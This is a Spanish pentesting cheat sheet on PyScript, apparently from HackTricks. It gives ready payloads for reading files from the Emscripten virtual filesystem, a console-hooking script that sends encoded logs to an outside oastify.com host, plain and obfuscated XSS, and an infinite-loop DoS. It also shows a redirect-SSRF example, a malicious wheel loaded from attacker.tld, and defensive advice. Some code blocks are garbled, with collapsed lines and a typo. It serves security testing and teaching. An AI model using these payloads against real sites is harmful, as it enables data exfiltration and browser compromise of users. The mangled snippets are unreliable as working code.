# Pyscript

## Guía de Pentesting de PyScript

PyScript es un nuevo framework desarrollado para integrar Python en HTML, de modo que pueda utilizarse junto con HTML. En esta hoja de referencia, encontrarás cómo utilizar PyScript para tus objetivos de pentesting.

### Volcando / recuperando archivos del sistema de archivos de memoria virtual de Emscripten:

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
Código:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
Resultado:

![Guía de Pentesting de PyScript - Volcado / Recuperación de archivos del sistema de archivos de memoria virtual de Emscripten: = fin.read() print(out)](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [Exfiltración de datos OOB del sistema de archivos de memoria virtual de Emscripten (monitorización de la consola)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`.<sup>[[3]](#references)[[7]](#references)</sup>\
\
Código:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
Resultado:

![Volcado / Recuperación de archivos del sistema de archivos de memoria virtual de Emscripten - Exfiltración de datos OOB del sistema de archivos de memoria virtual de Emscripten (monitoreo de la consola): Cross Site Scripting...](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Ordinary)

Código:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
Resultado:

![OOB Data Exfiltration of the Emscripten virtual memory filesystem (console monitoring) - Cross Site Scripting (Ordinary): Cross Site Scripting (Python Obfuscated)](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Obfuscated)

Code:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
Resultado:

![Cross Site Scripting (Normal) - Cross Site Scripting (Python Ofuscado): print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (JavaScript Obfuscation)

Código:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
Resultado:

![Cross Site Scripting (Python Obfuscated) - Cross Site Scripting (JavaScript Obfuscation): ataque DoS (bucle infinito)](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### ataque DoS (bucle infinito)

Código:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
Resultado:

![Cross Site Scripting (JavaScript Obfuscation) - DoS attack (bucle infinito):...](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## Nuevas vulnerabilidades y técnicas (2023-2025)

### Server-Side Request Forgery mediante redirecciones no controladas (CVE-2025-50182)

`urllib3 >= 2.2.0, < 2.5.0` ignora los parámetros de solicitud `redirect` y `retries` cuando se utiliza con el transporte de navegador de Pyodide. Si un atacante puede influir en las URL de destino, el código podría seguir redirecciones entre dominios incluso cuando se solicita a urllib3 que las desactive, debilitando las defensas contra SSRF.<sup>[[1]](#references)[[4]](#references)</sup>
```html
<script type="py">
import urllib3
http = urllib3.PoolManager()
r = http.request(
"GET",
"https://evil.example/302",
retries=False,
redirect=False,
)  # ignored by affected Pyodide/browser runtimes
print(r.status, r.url)
</script>
```
Actualiza a `urllib3 >= 2.5.0` para Node.js, pero no dependas de urllib3 para deshabilitar las redirecciones en los navegadores; valida los destinos o utiliza una allow-list antes de realizar solicitudes.<sup>[[4]](#references)</sup>

### Carga arbitraria de paquetes y ataques a la cadena de suministro

La configuración de Pyodide de PyScript acepta URLs arbitrarias de wheels en `packages`; si un atacante puede modificar o inyectar esa configuración, una importación posterior puede ejecutar Python controlado por el atacante en el navegador de la víctima.<sup>[[5]](#references)[[6]](#references)</sup>
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code at import
</script>
```
Pyodide puede instalar wheels de pure-Python desde URLs arbitrarias sin compilar el paquete para WebAssembly.<sup>[[6]](#references)</sup> Mantén esta configuración bajo control del desarrollador, permite únicamente nombres de paquetes o URLs exactos incluidos en una allow-list y verifica los digests de los wheels remotos durante la compilación o el despliegue.

### Cambios en la sanitización de la salida (2023+)

* En la implementación 2022.05.1 utilizada por los ejemplos heredados, `print()` escribe la salida `text/plain` sin escapar HTML y, por tanto, es vulnerable a XSS.<sup>[[8]](#references)</sup>
* El helper actual `display()` **escapa HTML de forma predeterminada** para strings simples; el markup sin procesar debe envolverse en `pyscript.HTML()`.<sup>[[2]](#references)</sup>
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
Usa `display()` para la entrada no confiable y no pases cadenas no confiables a `HTML()`.<sup>[[2]](#references)</sup>

---

## Prácticas recomendadas de defensa

* **Mantén los paquetes actualizados**: usa `urllib3 >= 2.5.0` en Node.js y revisa por separado las suposiciones sobre las redirecciones del navegador.<sup>[[4]](#references)</sup>
* **Restringe las fuentes de paquetes**: permite mediante una lista de permitidos los nombres de PyPI o las URL confiables exactas, y verifica los hashes de los wheel remotos durante la compilación o el despliegue.<sup>[[5]](#references)[[6]](#references)</sup>
* **Refuerza la Content Security Policy**: prohíbe JavaScript inline (`script-src 'self' 'sha256-…'`) para que los bloques `<script>` inyectados no puedan ejecutarse.
* **Prohíbe las etiquetas `<py-script>` / `<script type="py">` proporcionadas por el usuario**: sanea el HTML en el servidor antes de devolverlo a otros usuarios.
* **Aísla los workers**: si no necesitas acceso síncrono al DOM desde los workers, habilita el indicador `sync_main_only` para evitar `SharedArrayBuffer` y sus requisitos asociados de encabezados CORS.<sup>[[5]](#references)</sup>

## References

- [1] [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
- [2] [Documentación de elementos integrados de PyScript – `display` y `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)
- [3] [Cyber Guy - El arte del encadenamiento de vulnerabilidades (PyScript)](https://cyber-guy.gitbook.io/cyber-guy/blogs/the-art-of-vulnerability-chaining-pyscript)
- [4] [Aviso de seguridad de urllib3 – CVE-2025-50182](https://github.com/urllib3/urllib3/security/advisories/GHSA-48p4-8xcf-vxj5)
- [5] [Documentación de configuración de PyScript – paquetes y `sync_main_only`](https://docs.pyscript.net/2026.7.3/user-guide/configuration/)
- [6] [Pyodide – Carga de paquetes](https://pyodide.org/en/stable/usage/loading-packages.html)
- [7] [NVD – CVE-2022-30286](https://nvd.nist.gov/vuln/detail/CVE-2022-30286)
- [8] [Implementación de `pyscript.py` de PyScript 2022.05.1](https://github.com/pyscript/pyscript/blob/2022.05.1/pyscriptjs/src/pyscript.py)
{{#include ../../banners/hacktricks-training.md}}
